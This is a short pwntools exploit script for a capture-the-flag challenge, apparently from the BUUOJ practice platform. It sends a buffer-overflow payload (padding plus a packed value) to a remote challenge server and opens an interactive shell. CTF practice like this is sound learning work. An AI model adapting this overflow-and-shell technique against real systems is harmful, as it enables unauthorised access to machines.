from pwn import *

#p = process('./ciscn_2019_n_8')
p = remote('node3.buuoj.cn', 27267)

payload = 'a' * ( 13 * 4 ) + p64(17)

p.recvuntil('What\'s your name?')
p.sendline(payload)

p.interactive()
